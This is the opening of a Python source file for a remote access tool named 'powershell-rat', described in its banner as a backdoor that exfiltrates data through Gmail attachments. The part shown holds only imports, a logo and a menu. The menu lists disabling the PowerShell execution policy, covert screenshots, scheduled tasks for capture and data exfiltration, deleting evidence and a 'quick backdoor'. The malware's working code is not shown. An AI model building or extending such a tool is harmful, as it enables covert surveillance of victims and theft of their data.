#!/usr/bin/env python3
# -*- coding: utf -*- 

# imports
import os
import sys
import subprocess
from subprocess import check_output

# logo function
def logo():
	logo = '''

	powershell-rat

	[*] Author: krisna pranav
	[*] Twitter: krishpranav5
	[*] Descrption: Python based backdoor that uses Gmail to exfiltrate data as an attachment
	[*] Python version: 3.6.3
	[*] Powershell version: 5.1
	'''

	return logo

# options
OPTIONS = '''
1. Set Execution Policy to Unrestricted
2. Take screen shot
3. Schedule a task to take screen shots
4. Extract data via email
5. Schedule a task for data ex-filtration
6. Delete screen shots
7. Schedule a task to delete screen shots
8. Hail Mary: Quick backdoor
9. Exit
'''
